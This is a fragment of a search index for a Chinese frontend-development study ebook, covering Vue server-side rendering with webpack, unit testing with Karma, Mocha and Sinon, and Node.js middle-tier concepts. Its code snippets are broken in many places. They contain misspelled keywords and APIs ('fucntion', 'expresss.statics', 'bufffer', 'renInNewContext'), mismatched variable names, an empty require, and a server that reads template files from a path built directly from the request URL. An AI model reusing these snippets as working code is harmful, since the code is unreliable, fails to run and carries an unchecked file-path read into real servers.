create \u4e24\u4e2a\u751f\u547d\u5468\u671f\u51fd\u6570\uff08\u94a9\u5b50\uff09</p>"},{"location":"ebook-netease-senior-frontend/21-ssr/#_1","title":"\u6838\u5fc3\u5e93","text":"<p>vue + vue-server-renderer</p>"},{"location":"ebook-netease-senior-frontend/21-ssr/#ssr_2","title":"\u81ea\u5df1\u52a8\u624b\u642d\u5efaSSR","text":"<p>\u4e0d\u7ba1\u662f\u670d\u52a1\u5668\u7aef\u7684JS\u4ee3\u7801\uff0c\u8fd8\u662f\u6d4f\u89c8\u5668\u7aef\u7684JS\u4ee3\u7801\uff0c\u90fd\u6309\u7167\u751f\u4ea7\u73af\u5883\u8fdb\u884c\u6253\u5305\u3002\u53ea\u4e0d\u591a\u6253\u5305\u7684\u5165\u53e3\u662f\u4e0d\u540c\u3002</p> <p>\u9700\u8981\u628a webpack.prod.conf.js \u590d\u5236\u8fc7\u6765\uff0c\u7136\u540e\u4fee\u6539\u4e00\u4e0b\u3002</p> <p>\u53ef\u4ee5\u628a\u538b\u7f29\u90e8\u5206\u7684\u4ee3\u7801\u6ce8\u91ca\u6389</p> <p>Webpack \u6253\u5305\u65f6\uff0c\u4f1a\u628a\u6ce8\u91ca\u5220\u9664\uff0c\u4f46\u662f\u670d\u52a1\u7aefNodeJS\u8fd0\u884c\u662f\u9700\u8981\u4e00\u6bb5\u6ce8\u91ca\u4f5c\u4e3a\u63d2\u5165\u70b9\uff08\u7c7b\u4f3cDjango\u4e2d\u7684\u63d2\u5165\u70b9\uff09\uff0c\u6240\u4ee5\u9700\u8981\u628awebpack\u914d\u7f6e\u4e2d\u7684minify\u5220\u9664\u3002</p> <p>webpack\u652f\u6301\u6a21\u677f\u5f15\u64ce\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728HTML\u4e2d\u5199\u6a21\u677f\u5f15\u64ce\u5b57\u7b26\u4e32\u3002</p> <p>server.js</p> <pre><code>const express = require('express');\nconst fs = require('fs');\nconst Vue = require('vue');\n\n// \u5f00\u542fexpress\u670d\u52a1\nconst server = express();\n\n// \u8fd9\u662f\u5173\u952e\uff1a\u540e\u7aef\u4f7f\u7528renderer\u628aVUE\u6e32\u67d3\u6210HTML\nconst renderer = require('vue-server-renderer').createRenderer();\n\nfunction createApp(url) {\n  if (url === '/') {\n    url = '/index';\n  }\n  return new Vue({\n    // \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6a21\u677f\n    template: fs.readFileSync('template' + url + '.html', 'utf-8')\n  });\n}\n\nserver.get('*' , (req, res) =&gt; {\n  var app = createApp(req.url);\n  // \u628aVUE\u9879\u76ee\u8f6c\u6362\u6210HTML\n  renderer.renderToString(app).then(html =&gt; {\n    // \u628a\u8f6c\u6362\u540e\u7684\u7ed3\u679c\u653e\u5728\u6d4f\u89c8\u5668\u754c\u9762\u4e0a\n    res.end(html);\n  });\n});\n\nserver.listen(7000);\n</code></pre> <p>test.js</p> <pre><code>const Vue = require('vue');\nconst app = new Vue({\n  template: `&lt;div&gt;Hello World &lt;span&gt;{{num}}&lt;/span&gt;&lt;/div&gt;`,\n  data: {\n    num: 123\n  }\n});\n</code></pre> <p>index.html</p> <pre><code>&lt;body&gt;\n  &lt;div id=\"app\"&gt;&lt;/div&gt;\n  &lt;!-- build files will be auto injected --&gt;\n&lt;/body&gt;\n</code></pre> <p>index.ssr.html</p> <pre><code>&lt;body&gt;\n  &lt;!-- \u8fd9\u662f\u6a21\u677f\u63d2\u5165\u7684\u5165\u53e3\uff0c\u4e0b\u9762\u7684\u6ce8\u91ca\u4e0d\u80fd\u5220\u9664 --&gt;\n    &lt;!--vue-ssr-outlet--&gt;\n  &lt;script src=\"\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>/src/router/index.js</p> <pre><code>import Vue from 'vue';\nimport Router from 'vue-router';\nimport HelloWorld from '@/components/HelloWorld';\n\nVue.use(Router);\n\nexport function createRouter() {\n  return new Router({\n    mode: 'history',\n    routes: [\n      {\n        path: '/',\n        name: 'HelloWorld',\n        component: HelloWorld,\n      }\n    ]\n  })\n}\n</code></pre> <p>/src/main.js</p> <pre><code>import Vue from 'vue';\nimport App from './App';\n// import router from './router';\nimport { createRouter } from './router';\n\nVue.config.productionTip = false;\n\n// \u5bf9\u5916\u66b4\u9732\u4e00\u4e2a\u51fd\u6570\nexport fucntion createApp() {\n  const app = new Vue({\n    router,\n    render: h =&gt; h(App)\n  })\n  return { app, router }\n}\n\n// \u4e0b\u9762\u7684\u6ce8\u91ca\u6389\nnew Vue({\n  el: '#app',\n  router,\n  components: { App },\n  template: '&lt;App/&gt;'\n})\n</code></pre> <p>App.vue</p> <pre><code>&lt;template&gt;\n    &lt;div id=\"app\"&gt;\n    &lt;img src='./logo.png'/&gt;\n    &lt;router-view/&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {\n  name: 'App'\n}\n&lt;/script&gt;\n\n&lt;style&gt;&lt;/style&gt;\n</code></pre> <p>Client.js</p> <pre><code>import { createApp } from './main';\nconst { app, router } = createApp();\nrouter.onReady(() =&gt; {\n  app.$mount('#app');\n});\n</code></pre> <p>Server.js</p> <pre><code>import { createApp } from './main';\nexport default context =&gt; {\n  return new Promise((resolve, reject) =&gt; {\n    const { app, router } = createApp();\n    // \u5148\u8bbe\u7f6e\u8def\u7531router\u7684\u4f4d\u7f6e\n    router.push(context.url);\n    router.onReady(() =&gt; {\n      const matchedComponents = router.getMatchedComponents();\n      if (!matchedComponents.length) {\n        return reject({ code: 404 });\n      }\n      resolve(app);\n    }, reject);\n  })\n}\n</code></pre> <p>webpack.bundleserver.js</p> <p>webpack.bundleclient.js</p> <p>\u8fd9\u4e24\u4e2a\u6587\u4ef6\u548c\u751f\u4ea7\u73af\u5883\u4e0b\u9762\u7684webpack\u914d\u7f6e\u57fa\u672c\u76f8\u540c\uff0c\u9700\u8981\u505a\u4e00\u4e9b\u4fee\u6539</p> <p>\u4e0b\u9762\u662fclient\u914d\u7f6e\u90e8\u5206</p> <p>webpack.buldle-client.js</p> <pre><code>'use strict'\nconst path = require('path');\nconst utils = require('./utils');\nconst webpack = require('webpack');\nconst config = require('./config.js');\nconst merge = require('webpack-merge');\n// plugins: copy-webpack-plugin html-webpack-plugin \n// extract-text-webpack-plugin optimize-css-assets-webpack-plugin\n// uglifyjs-webpack-plugin\nconst VueSSRClientPlugin = require('');\n\nconst env = require('../config/prod.env');\n\nconst webpackConfig = merge(baseWebpackConfiging, {\n  module: {\n    rules: utils.styleLoaders({\n      sourceMap: config.build.productionSourceMap,\n      extract: true,\n      usePostCSS: true,\n    })\n  },\n  // add entry\n  entry: {\n    app: './src/client.js'\n  },\n  devtool: config.build.productionSourceMap ? config.build.devtool : false,\n  output: {\n    path: config.buildassetsRoot,\n    filename: utils.assetsPath('js/[name].[chunkhash].js'),\n    chunkFilename: utils.assetsPath('js/[id].[chunkhash].js')\n  },\n  plugins: [\n    new VueSSRClientPlugin(),\n    new webpack.DefinePlugin({\n      'process.env': env\n    }),\n    new UglifyJsPlugin({\n      uglifyOptions: {\n        compress: {\n          warnings: false\n        }\n      },\n      sourceMap: config.build.productionSourceMap,\n      parallel: true\n    }),\n    // extract css into its own file\n    new ExtractTextPlugin({\n      filename: utils.assetsPath('css/[name].[contenthash].css'),\n    }),\n    // \u5f88\u591a\u7684\u63d2\u4ef6\u4e3a\u4e86\u538b\u7f29\u6253\u5305\uff0c\u6d4b\u8bd5\u65f6\u53ef\u4ee5\u6ce8\u91ca\u8fd9\u4e9b\u63d2\u4ef6\n  ],\n});\n</code></pre> <p>webpack.bundleserver.js</p> <pre><code>const VueSSRServerPlugin = require('vue-server-renderer/server-plugin');\n\n// \u5176\u4ed6\u914d\u7f6e\u76f8\u540c\uff0c\u9700\u8981\u8bbe\u7f6e\u4e0d\u540c\u7684\u5165\u53e3\u51fd\u6570\nexport default {\n  entry: {\n    app: './src/serve.js'\n  },\n  target: 'node',\n  output: {\n    libraryTarget: 'commonjs2'\n  },\n  plugins: [\n    new VueSSRServerPlugin(),\n    new webpack.DefinePlugin({\n      'process.env': env\n    }),\n    // \u4e2d\u95f4\u7684\u5176\u4ed6\u63d2\u4ef6\u7701\u7565\n    // compress extracted CSS we are using this plugin so that possible duplicated CSS from different components can be deputed. \n    //  \u538b\u7f29\u63d0\u53d6\u7684CSS\uff0c\u786e\u4fdd\u6765\u6e90\u4e8e\u4e0d\u540c\u7ec4\u4ef6\u7684CSS\u6587\u4ef6\u88ab\u538b\u7f29\n    new OptimizeCSSPlugin({\n      cssProcessorOptions: config.build.productionSourceMap ? { date: true, map: {inline: false}} : {safe: true}\n    }),\n    // generate dist index.html with correct asset hash for caching\n    new HtmlWebpackPlugin({\n      // filename: config.build.index,\n      filename: 'index.ssr.html',\n      template: 'index.ssr.html',\n      inject: true,\n      files: {\n        js: 'app.js'\n      },\n      // \u4e0b\u9762\u7684\u538b\u7f29\uff08\u5728\u6d4b\u8bd5\u65f6\u53ef\u4ee5\u5220\u9664\uff09\n      //minify: {\n      //  removeComments: true,\n      //  collapseWhitespace: true,\n      //  removeAttributeQuotes: true,\n      //},\n      chunksSortMode: 'dependency'\n    }),\n    // keep module.id stable when vendor modules does not change\n    new webpack.HashedModuleIdsPlugin(),\n    // enable scope histing\n    new webpack.optimize.ModuleConcatenationPlugin(),\n  ],\n}\n</code></pre> <p>webpackbase.config.js</p> <pre><code>function resolve(dir) {\n  return path.join(__dirname, '..', dir);\n}\n\nmodule.exports = {\n  context: path.resolve(__dirname, '../'),\n  entry: {\n    app: './src/main.js'\n  },\n  output: {\n    path: config.build.assetsRoot,\n    filename: '[name].js',\n    publicPath: process.env.NODE_ENV === 'production' ? config.build.assetsPublicPath : config.dev.assetsPublicPath\n  },\n  resolve: {\n    extensions: ['.js', '.vue', '.json'],\n    alias: {\n        'vue$': 'vue/dist/vue.esm.js',\n        '@': resolve('src'),\n    }\n  }\n}\n</code></pre> <p>package.json</p> <pre><code>{\n  \"scripts\": {\n    \"start\": \"npm run dev\",\n    \"build\": \"node build/build.js\",\n    \"build:client\": \"webpack --config build/webpack.buildclient.js\",\n    \"build:server\": \"webpack --config build/webpack.buildserver.js\",\n  }\n}\n</code></pre> <p>server.js</p> <pre><code>const express = require('express');\nconst server = express();\nconst { createBundleRenderer } = require('vue-server-renderer');\nconst path = require('path');\nconst fs = require('fs');\nconst serverBundle = require(path.resolve(__dirname, '../dist/vue-ssrs-servers-bundle.json'));\nconst sclientManifest = require(path.resolve(__dirname, '../dist/vue-ssr-client-manifest.json'));\nconst template = fs.readFileSync(path.resolve(__dirname, '../dist/index.ssr.html'), 'utf-8');\nconst renderer = createBundleRenderer(serverBundle, {\n  renInNewContext: false,\n  template: template,\n  clientManifest: clientManifest\n});\nserver.uses(expresss.statics(path.resolve(__dirname, '../dists')));\nserver.get('*', (req, res) =&gt; {\n  const contexts = {url: req.url};\n  const ssrStream = renderer.renderToStream(context);\n  let buffers = [];\n  ssrStream.on('error', (error) =&gt; {console.log(error);});\n  ssrStream.on('data', (data) =&gt; {bufffer.push(data);});\n  ssrStream.on('end', () =&gt; {\n    res.end(Buffer.concat(buffers));\n  });\n});\nserver.listen(3000);\n</code></pre> <p>serve.js</p> <pre><code>import { createApp } from './main';\nexport default context =&gt; {\n  return new Promise((resolve, reject) =&gt; {\n    const { app, router } = createApp();\n    router.push(context.url);\n    router.onReady(() =&gt; {\n      const matchedComponents = router.getMatchedComponents();\n      if (!matchedComponents.length) {\n        return reject({ code: 404 });\n      }\n      resolve(app);\n    });\n  }, reject);\n}\n</code></pre> <pre><code>node ./server/server.js\n</code></pre>"},{"location":"ebook-netease-senior-frontend/21-ssr/#vue-nuxt-ssr","title":"VUE \u4e2d\u4f7f\u7528 Nuxt \u6846\u67b6\u5b9e\u73b0SSR","text":"<p>\u5176\u4ed6\u53c2\u8003\u6587\u732e\uff1ahttps://www.jianshu.com/p/10b6074d772</p>"},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/","title":"24-\u5355\u5143\u6d4b\u8bd5\u5982\u4f55\u505a","text":""},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#24-","title":"24-\u5355\u5143\u6d4b\u8bd5\u5982\u4f55\u505a","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 4250  \u9605\u8bfb9\u5206\u949f</p> <p>\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u9700\u8981\u6d4b\u8bd5\uff1a\u767d\u76d2\u6d4b\u8bd5\uff08\u5355\u5143\u6d4b\u8bd5\uff09\u548c\u9ed1\u76d2\u6d4b\u8bd5\uff08\u70b9\u51fb\u754c\u9762\u529f\u80fd\uff09</p> <ul> <li>\u4ec0\u4e48\u662f\u5355\u5143\u6d4b\u8bd5</li> <li>\u5355\u5143\u6d4b\u8bd5\u5e38\u7528\u7684\u5e93</li> <li>VUE\u4e2d\u5982\u4f55\u4f7f\u7528\u5355\u5143\u6d4b\u8bd5</li> </ul>"},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_1","title":"\u5355\u5143\u6d4b\u8bd5\u6982\u5ff5","text":""},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_2","title":"\u6982\u5ff5","text":"<p>\u5de5\u7a0b\u5316\uff1a\u4e3a\u4e86\u5e94\u4ed8\u5de5\u7a0b\u4f53\u7cfb\u7684\u4e0d\u65ad\u590d\u6742\u5316\uff0c\u589e\u52a0\u4e00\u4e9b\u5de5\u5177\u8ba9\u6211\u4eec\u66f4\u65b9\u4fbf\u5de5\u4f5c</p> <p>\u524d\u7aef\u5de5\u7a0b\u5316\uff1awebpack + git + \u5355\u5143\u6d4b\u8bd5\uff08\u4f7f\u7528\u8f6f\u4ef6\u5de5\u7a0b\u7684\u65b9\u6cd5\u5904\u7406\u524d\u7aef\uff09</p> <p>\u5355\u5143\u6d4b\u8bd5\uff1a\u5bf9\u8f6f\u4ef6\u4e2d\u6700\u5c0f\u7684\u53ef\u6d4b\u8bd5\u5355\u5143\u8fdb\u884c\u6d4b\u8bd5\u3002</p> <p>\u5355\u5143\u6d4b\u8bd5\u7684\u76ee\u7684\uff1a\u56e2\u961f\u5206\u6a21\u5757\u5f00\u53d1\uff08\u524d\u540e\u7aef\u5206\u79bb\uff09\uff0c\u65b9\u4fbf\u5b9a\u4f4d\u6a21\u5757\u51fa\u73b0\u95ee\u9898\uff1b\u4fdd\u8bc1\u4e86\u4ee3\u7801\u7684\u8d28\u91cf\uff1b\u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1\u3002</p> <p>\u5355\u5143\u6d4b\u8bd5\u7684\u4e24\u79cd\u7c7b\u578b\uff1aTDD\uff08\u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1\uff09BDD\uff08\u884c\u4e3a\u9a71\u52a8\u5f00\u53d1\uff09</p> <p>TDD\uff1a \u4ece\u9700\u6c42\u89d2\u5ea6\u770b\uff0c\u7528\u6237\u9700\u8981\u4ec0\u4e48\uff0c\u5982\u679c\u4e0d\u662f\u5c31\u662f\u4ee3\u7801\u9519\u8bef\uff08\u7528\u6237\u9700\u6c42\u5206\u6790-\u7f16\u5199\u5355\u5143\u6d4b\u8bd5-\u7f16\u5199\u4ee3\u7801\u5e76\u901a\u8fc7\u5355\u5143\u6d4b\u8bd5-\u4ee3\u7801\u91cd\u6784\uff09</p> <p>BDD\uff1a\u884c\u4e3a\u9a71\u52a8\u5f00\u53d1\uff1a\u4ece\u5177\u4f53\u7684\u529f\u80fd\u89d2\u5ea6\u51fa\u53d1\uff0c\u7ed3\u679c\u5e94\u8be5\u662f\u4ec0\u4e48\u3002\uff08\u4ece\u4ea7\u54c1\u89d2\u5ea6\u5b9a\u4e49\u76ee\u6807-\u627e\u5230\u76ee\u6807\u5b9e\u73b0\u7684\u65b9\u6cd5-\u7f16\u5199\u5355\u5143\u6d4b\u8bd5-\u5b9e\u73b0\u884c\u4e3a-\u68c0\u67e5\u4ea7\u54c1\uff09</p> <p>Mock\u5e93\u4f5c\u7528\uff1a\u5982\u679c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u4f7f\u7528\u53e6\u4e00\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4f7f\u7528Mock\u5e93\u5c4f\u853d\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5e26\u6765\u7684\u5f71\u54cd\u3002</p> <p>\u6d4b\u8bd5\u7528\u4f8b\uff1a\u6d4b\u8bd5\u8f93\u5165+\u6267\u884c+\u9884\u671f\u8f93\u51fa\u7ed3\u679c</p> <p>\u6d4b\u8bd5\u539f\u5219\uff1a\u6d4b\u8bd5\u6848\u4f8b\u9700\u8981\u53ca\u65f6\u7ef4\u62a4\u4fee\u590d\uff08\u6d4b\u8bd5\u548c\u4ee3\u7801\u540c\u6b65\u4fee\u6539\uff09code review\uff1a\u786e\u4fdd\u4ee3\u7801\u529f\u80fd\u6b63\u5e38\uff1b\u4ee3\u7801\u7b26\u5408\u9879\u76ee\u89c4\u8303</p>"},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_3","title":"\u5355\u5143\u6d4b\u8bd5\u4f7f\u7528\u54ea\u4e9b\u5e93","text":""},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_4","title":"\u5355\u5143\u6d4b\u8bd5\u8303\u56f4","text":"<p>\u6d4b\u8bd5\u6846\u67b6+\u65ad\u8a00\u5e93+Mock\u5e93+test runner+\u8986\u76d6\u7387\u5de5\u5177</p>"},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_5","title":"\u6d4b\u8bd5\u6846\u67b6","text":"<p>Jest \u96c6\u6210\u4e86\u65ad\u8a00\u5e93\u548cMock\uff0c\u57fa\u4e8ejasmine\uff0c\u5bf9React\u53cb\u597d</p> <p>Jasmine bdd\u98ce\u683c\uff0c\u5305\u542b assert + Mock</p> <p>Mocha\u9700\u8981\u81ea\u5df1\u53bb\u914d\u7f6e\u65ad\u8a00\u5e93\u548cMock\uff08\u9002\u5408node\u548c\u6d4f\u89c8\u5668\uff09</p> <p>\u65ad\u8a00\u5e93:chai (\u5168\u9762)\u3001should\u3001expect\u3001Assert (node)</p> <p>Mock\u5e93:sinons</p> <p>TestRunner:karma</p> <p>\u8986\u76d6\u7387\u5de5\u5177\uff1aistanbul</p>"},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_6","title":"\u6846\u67b6\u4e2d\u4f7f\u7528\u5355\u5143\u6d4b\u8bd5","text":"<p>phantomJS \u65e0\u5934\u6d4f\u89c8\u5668\uff1a\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u6d4f\u89c8\u5668\u7684\u7279\u70b9\uff0c\u9075\u5faa\u524d\u7aef\u7684\u6d4b\u8bd5\u89c4\u8303\uff08\u4e3b\u8981\u7528\u4e8e\u6d4b\u8bd5\uff09</p> <p>React \u901a\u5e38\u4f7f\u7528 Jest \u505a\u5355\u5143\u6d4b\u8bd5\uff1bVUE\u5728\u521d\u59cb\u5316\u4f7f\u7528 vue-cli \u53ef\u4ee5</p> <p>\u53ef\u4ee5\u9009\u62e9Jest\uff0c\u53ef\u4ee5\u9009\u62e9mocha+chai+sinon\u81ea\u5df1\u914d\u7f6e</p> <pre><code>function a() {\n  b();\n}\nfunction b() {\n\n}\n</code></pre> <p>\u6d4b\u8bd5\u9700\u8981\u589e\u52a0\u914d\u7f6e\u6587\u4ef6</p> <p>karma.conf.js</p> <pre><code>module.exports = function karmaConfig(config) {\n  config.set({\n    browser: ['PhantomJS'],\n    frameworks: ['mocha', 'sinon-chai'],\n    reporters: ['spec', 'coverage'],\n    files: ['./index.js'],\n    preprocessors: {\n      './index.js': ['webpack', 'sourcemap']\n    },\n    webpack: webpackConfig,\n    webpackMiddleware: {\n      noInfo: true\n    },\n  });\n}\n</code></pre> <p>webpack.test.config.js</p> <p>index.js \u662f\u6846\u67b6\u9ed8\u8ba4\u63d0\u4f9b\u7684</p> <p>Package.json</p> <pre><code>{\n  \"scripts\": {\n    \"test\": \"npm run unit\",\n    \"unit\": \"cross-env BABEL_ENV=test karma start test/unit/karma.conf.js --single-run\",\n  }\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/#_7","title":"\u4f8b\u5b50","text":"<p>helloworld.spec.js</p> <pre><code>import Vue from 'vue';\nimport HelloWorld from '@/components/HelloWorld';\nimport Promise from 'es6-promise';\nPromise.polyfill();\n\ndescribe('Hello.vue', () =&gt; {\n  it('should render correct contents', () =&gt; {\n    const Constructor = Vue.extend(HelloWorld);\n    // \u7ec4\u4ef6\u6784\u9020\u7c7b\n    const vm = new Constructor().$mount();\n    expect(vm.$el.querySelector('.hello h1').textContent).to.equal('Welcome to my Vue.js App');\n  });\n\n  // \u6d4b\u8bd5\u65b9\u6cd5\uff08\u5f02\u6b65\u7684\u65b9\u6cd5\u5982\u4f55\u6d4b\u8bd5\uff09\n  it('test function m1', () =&gt; {\n    const m1 = vm.m1;\n    expect(m1(2, 3)).to.equal(5);\n  });\n  it('async m2 should return 3', () =&gt; {\n    const m2 = vm.m2;\n    m2(1, 2, data =&gt; {\n      expect(data).to.equal(3);\n    });\n    m2(1, 2).then((res) =&gt; {\n      expect(data).to.equal(3);\n    });\n  });\n  // getmes\n  it('\u63a5\u53e3\u88ab\u8bf7\u6c42', () =&gt; {\n    // spy stub\n    let axiosspy = sinon.spy(axios, 'get');\n    console.log(axiosspy.callCount);\n    let callback = sinon.spy(() =&gt; {\n      return 5;\n    });\n    const getmes = vm.getmes;\n    expect(getmes(callback)).to.equal(4);\n  });\n});\n\n// \u539f\u7ec4\u4ef6\nmethods: {\n  m1: function(a, b) {\n    return a + b;\n  },\n  m2: function(a, b, fn) {\n    setTimeout(() =&gt; {\n      fn(a + b);\n    }, 1000);\n  },\n  getmes: function(fn) {\n    axios.get('www.baidu.com');\n    let res = fn();\n    this.data = res;\n    return data;\n  }\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/","title":"25-\u57fa\u4e8eNodeJS\u6253\u9020Web\u67b6\u6784\u4e2d\u95f4\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5633  \u9605\u8bfb12\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/#_1","title":"\u4e2d\u95f4\u5c42\u4e0e\u4e2d\u95f4\u4ef6","text":"<p>\u8fd9\u4e24\u4e2a\u6982\u5ff5\u5b8c\u5168\u4e0d\u4e00\u6837</p>"},{"location":"ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/#_2","title":"\u4e2d\u95f4\u5c42","text":"<p>\u5728\u4f20\u7edf\u7684BS\u67b6\u6784\u4e2d\uff08vrowser+server\uff09\uff0c\u4e2d\u95f4\u589e\u52a0\u4e00\u4e2a\u5c42\uff08Middle\uff09\uff0c\u6765\u5904\u7406\u4fe1\u606f\u4f20\u9012\u8f6c\u53d1\uff08\u7c7b\u4f3c\u4e8e\u4f20\u7eb8\u6761\u7684\u4f8b\u5b50\uff09\u3002\u5b98\u65b9\u89e3\u91ca\uff1aMiddle Tier \u5e94\u7528\u7a0b\u5e8f\u670d\u52a1\u5668\u5c42\u6216\u8005\u5e94\u7528\u670d\u52a1\u5c42\uff0c\u662f\u7528\u6237\u63a5\u53e3\u6216\u8005Web\u5ba2\u6237\u7aef\u4e0e\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u903b\u8f91\u5c42\u3002</p> <p>\u4f20\u7edf\u7684\u67b6\u6784\u662f\uff1aBS\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u76f4\u63a5\u901a\u4fe1\u3002\u52a0\u5165\u4e2d\u95f4\u5c42\u540e\uff0c\u662fBMS\u67b6\u6784\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u9700\u8981\u7ecf\u8fc7\u4e2d\u95f4\u5c42\u3002</p>"},{"location":"ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/#_3","title":"\u4e2d\u95f4\u4ef6","text":"<p>\u4e2d\u95f4\u5c42\u662f\u4e00\u4e2aweb\u6846\u67b6\u7684\u903b\u8f91\u5c42\uff0c\u4e2d\u95f4\u4ef6\u662f\u4e00\u4e2a\u51fd\u6570\u6216\u8005\u63d2\u4ef6\uff08\u4e1a\u52a1\u7528\u9014\uff09\u3002\u5b98\u65b9\u89e3\u91ca\uff1aMiddleWare \u662f\u4e00\u4e2a\u5bf9\u7528\u6237\u8bf7\u6c42\u8fdb\u884c\u8fc7\u6ee4\u548c\u9884\u5904\u7406\u7684\u51fd\u6570\uff0c\u4e00\u822c\u4e0d\u4f1a\u5bf9\u5ba2\u6237\u7aef\u8fdb\u884c\u76f8\u5e94\uff0c\u800c\u662f\u628a\u5904\u7406\u540e\u7684\u7ed3\u679c\u4f20\u9012\u4e0b\u53bb\u3002</p> <p>Express\u662f\u4e00\u4e2a\u81ea\u8eab\u529f\u80fd\u6781\u7b80\uff0c\u5b8c\u5168\u7531\u8def\u7531\u548c\u4e2d\u95f4\u4ef6\u6784\u6210\u7684\u4e00\u4e2aweb\u5f00\u53d1\u6846\u67b6\u3002express\u5e94\u7528\u5c31\u662f\u5728\u8c03\u7528\u5404\u79cd\u4e2d\u95f4\u4ef6\u3002express = \u81ea\u8eab\u529f\u80fd\u6781\u7b80+\u8def\u7531+\u4e2d\u95f4\u4ef6\u3002\u4e2d\u95f4\u4ef6\u7c7b\u4f3c\u4e8e\u63d2\u4ef6\uff0c\u53ef\u4ee5\u6269\u5c55\u529f\u80fd\uff0c\u662f\u5b9e\u73b0\u67d0\u79cd\u529f\u80fd\u7684\u51fd\u6570\u3002\u5c01\u88c5\u4e86\u4e00\u4e9b\u590d\u6742\u4f46\u662f\u901a\u7528\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u901a\u8fc7npm-yarn\u8fdb\u884c\u5b89\u88c5\u3002</p>"},{"location":"ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/#_4","title":"\u4e2d\u95f4\u5c42\u7684\u610f\u4e49","text":"<p>1\u3001\u5927\u524d\u7aef\uff1a\u4f20\u7edf\u7684\u540e\u7aef\u63d0\u4f9b\u4e0d\u540c\u63a5\u53e3\uff0c\u73b0\u5728\u540e\u7aef\u63d0\u4f9b\u4e0d\u540c\u670d\u52a1\uff08\u5546\u54c1\u7f51\u7ad9\uff0c\u63d0\u4f9b\u5546\u54c1\u670d\u52a1\uff0c\u8d2d\u7269\u8f66\u670d\u52a1\uff0c\u652f\u4ed8\u670d\u52a1\uff0c\u4ed3\u50a8\u670d\u52a1\uff09\uff0c\u6b64\u65f6\u9700\u8981\u4e2d\u95f4\u5c42\u5c06\u4e0d\u540c\u7684\u670d\u52a1\u8f6c\u6362\u6210\u524d\u7aef\u4f7f\u7528\u7684\u63a5\u53e3\uff08\u540e\u7aef\u4e13\u6ce8\u4e8e\u670d\u52a1\u5668\u6570\u636e\u5e93\uff09\u3002Docker \u51fa\u73b0\u4f7f\u5f97\u540e\u7aef\u5404\u79cd\u670d\u52a1\u5206\u79bb\u3002\u6240\u4ee5\u524d\u7aef\u53d8\u6210\u4e86\u5927\u524d\u7aef\u3002</p> <p>2\u3001\u5b89\u5168\u65b9\u9762\uff1a\u907f\u514d\u4e86\u670d\u52a1\u5668\u76f4\u63a5\u66b4\u9732\u5728\u7528\u6237\u524d\uff08\u7528\u6237\u4e0d\u77e5\u9053\u771f\u5b9e\u7684IP\uff09\u5728\u4e2d\u95f4\u5c42\u4e2d\u4f7f\u7528 pm2 + nginx \u53cd\u5411\u4ee3\u7406\u8fdb\u7a0b\u5b88\u62a4\uff0c\u57fa\u672c\u5b89\u5168\u3002</p> 